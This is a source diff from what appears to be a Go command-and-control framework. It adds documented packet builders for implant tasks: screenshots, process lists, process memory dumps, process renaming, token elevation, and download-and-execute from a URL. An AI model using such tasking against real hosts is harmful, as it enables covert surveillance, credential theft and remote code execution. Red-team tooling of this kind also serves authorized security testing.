@@ -35,8 +35,10 @@ const (
 	MvMounts  uint8 = 0x10
 	MvRevSelf uint8 = 0x11
 	MvProfile uint8 = 0x12
+	MvScript  uint8 = 0xF0 // TODO(dij): setup
 
 	// Built in Task Message ID Values
+	// Supported by 'DefaultClientMux'
 	TvDownload    uint8 = 0xC0
 	TvUpload      uint8 = 0xC1
 	TvExecute     uint8 = 0xC2
@@ -47,6 +49,10 @@ const (
 	TvReloadDLL   uint8 = 0xC7
 	TvPull        uint8 = 0xC8
 	TvPullExecute uint8 = 0xC9
+	TvRename      uint8 = 0xCA
+	TvScreenShot  uint8 = 0xCB
+	TvProcDump    uint8 = 0xCC
+	TvProcList    uint8 = 0xCD
 )
 
 // Mappings is an fixed size array that contains the Tasker mappings for each
@@ -65,6 +71,10 @@ var Mappings = [0xFF]Tasker{
 	TvDLL:         taskInject,
 	TvCheckDLL:    taskCheck,
 	TvReloadDLL:   taskReload,
+	TvRename:      taskRename,
+	TvScreenShot:  taskScreenShot,
+	TvProcDump:    taskProcDump,
+	TvProcList:    taskProcList,
 }
 
 // Tasklet is an interface that allows for Sessions to be directly tasked
@@ -105,8 +115,7 @@ func Pwd() *com.Packet {
 }
 
 // Mounts returns a list mounted drives Packet. This can be used to instruct
-// the client to return a string list of all the mount points on the client
-// device.
+// the client to return a string list of all the mount points on the host device.
 //
 // C2 Details:
 //  ID: MvMounts
@@ -122,9 +131,10 @@ func Mounts() *com.Packet {
 	return &com.Packet{ID: MvMounts}
 }
 
-// Refresh will instruct the client to read update it's internal Device storage
-// and return the new result. This can be used to detect new network interfaces
-// added/removed and changes to hostname/user status.
+// Refresh returns a refresh Packet. This will instruct the client to re-update
+// it's internal Device storage and return the new result. This can be used to
+// detect new network interfaces added/removed and changes to hostname/user
+// status.
 //
 // This is NOT needed after a Migration, as this happens automatically.
 //
@@ -137,9 +147,28 @@ func Mounts() *com.Packet {
 //      Machine // Updated device details
 //
 // C2 Client Command:
-//    refresh
+//  refresh
 func Refresh() *com.Packet {
 	return &com.Packet{ID: MvRefresh}
+}
+
+// ScreenShot returns a screenshot Packet. This will instruct the client to
+// attempt to get a screenshot of all the current active desktops on the host.
+// If successful, the returned data is a binary blob of the resulting image,
+// encoded in the PNG image format.
+//
+// C2 Details:
+//  ID: TVScreenShot
+//
+//  Input:
+//      <none>
+//  Output:
+//      []byte // Data
+//
+// C2 Client Command:
+//  screenshot
+func ScreenShot() *com.Packet {
+	return &com.Packet{ID: TvScreenShot}
 }
 
 // Ls returns a file list Packet. This can be used to instruct the client
@@ -157,7 +186,7 @@ func Refresh() *com.Packet {
 //      string          // Directory
 //  Output:
 //      uint32          // Count
-//      []File struct {
+//      []File struct { // List of Files
 //          string      // Name
 //          int32       // Mode
 //          uint64      // Size
@@ -171,6 +200,48 @@ func Ls(d string) *com.Packet {
 	n := &com.Packet{ID: MvList}
 	n.WriteString(d)
 	return n
+}
+
+// RevToSelf returns a Rev2Self Packet. This can be used to instruct Windows
+// based devices to drop any previous elevated Tokens they may posess and return
+// to their "normal" Token.
+//
+// This task result does not return any data, only errors if it fails.
+//
+// C2 Details:
+//  ID: MvRevSelf
+//
+//  Input:
+//      <none>
+//  Output:
+//      <none>
+//
+// C2 Client Command:
+//  rev2self
+func RevToSelf() *com.Packet {
+	return &com.Packet{ID: MvRevSelf}
+}
+
+// ProcessList returns a list processes Packet. This can be used to instruct
+// the client to return a list of the current running host's processes.
+//
+// C2 Details:
+//  ID: TvProcList
+//
+//  Input:
+//      <none>
+//  Output:
+//      uint32              // Count
+//      []cmd.ProcessInfo { // List of Running Processes
+//          uint32          // Process ID
+//          uint32          // Parent Process ID
+//          string          // Process Image Name
+//      }
+//
+// C2 Client Command:
+//  ps
+func ProcessList() *com.Packet {
+	return &com.Packet{ID: TvProcList}
 }
 
 // Cwd returns a change directory Packet. This can be used to instruct the
@@ -198,8 +269,8 @@ func Cwd(d string) *com.Packet {
 	return n
 }
 
-// Download will instruct the client to read the (client local) filepath
-// provided and return the raw binary data.
+// Download returns a download Packet. This will instruct the client to
+// read the (client local) filepath provided and return the raw binary data.
 //
 // The source path may contain environment variables that will be resolved
 // during runtime.
@@ -216,15 +287,35 @@ func Cwd(d string) *com.Packet {
 //      []byte // Data
 //
 // C2 Client Command:
-//    download <src> [dest]
+//  download <src> [dest]
 func Download(src string) *com.Packet {
 	n := &com.Packet{ID: TvDownload}
 	n.WriteString(src)
 	return n
 }
 
-// Pull will instruct the client to download the resource from the provided
-// URL and write the data to the supplied local filesystem path.
+// ProcessName returns a process name change Packet. This can be used to instruct
+// the client to change from it's current in-memory name to the specified string.
+//
+// C2 Details:
+//  ID: TvRename
+//
+//  Input:
+//      string // New Process Name
+//  Output:
+//      <none>
+//
+// C2 Client Command:
+//  proc-name <name>
+func ProcessName(s string) *com.Packet {
+	n := &com.Packet{ID: TvRename}
+	n.WriteString(s)
+	return n
+}
+
+// Pull returns a pull Packet. This will instruct the client to download the
+// resource from the provided URL and write the data to the supplied local
+// filesystem path.
 //
 // The path may contain environment variables that will be resolved during
 // runtime.
@@ -248,9 +339,37 @@ func Pull(url, path string) *com.Packet {
 	return n
 }
 
-// Upload will instruct the client to write the provided byte array to the
-// filepath provided. The client will return the number of bytes written and
-// the resulting file path.
+// Elevate returns an evelate Packet. This will instruct the client to use the
+// provided Filter to attempt to get a Token handle to an elevated process. If
+// the Filter is nil, then the client will attempt at any elevated process.
+//
+// C2 Details:
+//  ID: MvElevate
+//
+//  Input:
+//      Filter struct { // Filter
+//          bool        // Filter Status
+//          uint32      // PID
+//          bool        // Fallback
+//          uint8       // Session
+//          uint8       // Elevated
+//          []string    // Exclude
+//          []string    // Include
+//      }
+//  Output:
+//      <none>
+//
+// C2 Client Command:
+//  elevate [target]
+func Elevate(f *filter.Filter) *com.Packet {
+	n := &com.Packet{ID: MvElevate}
+	f.MarshalStream(n)
+	return n
+}
+
+// Upload returns a upload Packet. This will instruct the client to write the
+// provided byte array to the filepath provided. The client will return the
+// number of bytes written and the resulting expanded file path.
 //
 // The destination path may contain environment variables that will be resolved
 // during runtime.
@@ -259,11 +378,11 @@ func Pull(url, path string) *com.Packet {
 //  ID: TvUpload
 //
 //  Input:
-//      string (dts)
-//      []byte (file data)
+//      string // Destination
+//      []byte // File Data
 //  Output:
-//      string (expanded path)
-//      uint64 (file size written)
+//      string // Expanded Destination Path
+//      uint64 // Byte Count Written
 //
 // C2 Client Command:
 //  upload <src> <dst>
@@ -274,9 +393,37 @@ func Upload(dst string, b []byte) *com.Packet {
 	return n
 }
 
-// UploadFile will instruct the client to write the provided (server local) file
-// content to the filepath provided. The client will return the number of bytes
-// written and the resulting file path.
+// ProcessDump will instruct the client to attempt to read and download then
+// memory of the filter target. The returned data is a binary blob of the memory
+// if successful.
+//
+// C2 Details:
+//  ID: TvProcDump
+//
+//  Input:
+//      Filter struct { // Filter
+//          bool        // Filter Status
+//          uint32      // PID
+//          bool        // Fallback
+//          uint8       // Session
+//          uint8       // Elevated
+//          []string    // Exclude
+//          []string    // Include
+//      }
+//  Output:
+//      []byte // Data
+//
+// C2 Client Command:
+//  dump <target>
+func ProcessDump(f *filter.Filter) *com.Packet {
+	n := &com.Packet{ID: TvProcDump}
+	f.MarshalStream(n)
+	return n
+}
+
+// UploadFile returns a upload  Packet. This will instruct the client to write
+// the provided (server local) file content to the filepath provided. The client
+// will return the number of bytes written and the resulting expanded file path.
 //
 // The destination path may contain environment variables that will be resolved
 // during runtime.
@@ -288,11 +435,11 @@ func Upload(dst string, b []byte) *com.Packet {
 //  ID: TvUpload
 //
 //  Input:
-//      string (dts)
-//      []byte (file data)
+//      string // Destination
+//      []byte // File Data
 //  Output:
-//      string (expanded path)
-//      uint64 (file size written)
+//      string // Expanded Destination Path
+//      uint64 // Byte Count Written
 //
 // C2 Client Command:
 //  upload <src> <dst>
@@ -306,9 +453,9 @@ func UploadFile(dst, src string) (*com.Packet, error) {
 	return n, err
 }
 
-// UploadReader will instruct the client to write the provided reader content
-// to the filepath provided. The client will return the number of bytes written
-// and the resulting file path.
+// UploadReader returns a upload Packet. This will instruct the client to write
+// the provided reader content to the filepath provided. The client will return
+// the number of bytes written and the resulting file path.
 //
 // The destination path may contain environment variables that will be resolved
 // during runtime.
@@ -317,11 +464,11 @@ func UploadFile(dst, src string) (*com.Packet, error) {
 //  ID: TvUpload
 //
 //  Input:
-//      string (dts)
-//      []byte (file data)
+//      string // Destination
+//      []byte // File Data
 //  Output:
-//      string (expanded path)
-//      uint64 (file size written)
+//      string // Expanded Destination Path
+//      uint64 // Byte Count Written
 //
 // C2 Client Command:
 //  upload <src> <dst>
@@ -332,11 +479,11 @@ func UploadReader(dst string, r io.Reader) (*com.Packet, error) {
 	return n, err
 }
 
-// PullExecute will instruct the client to download the resource from the
-// provided URL and execute the downloaded data.
+// PullExecute returns a pull and execute Packet. This will instruct the client
+// to download the resource from the provided URL and execute the downloaded data.
 //
 // The download data may be saved in a temporary location depending on what the
-// resulting data type is or file extension.
+// resulting data type is or file extension. (see 'man.ParseDownloadHeader')
 //
 // This function allows for specifying a Filter struct to specify the target
 // parent process and the boolean flag can be set to true/false to specify
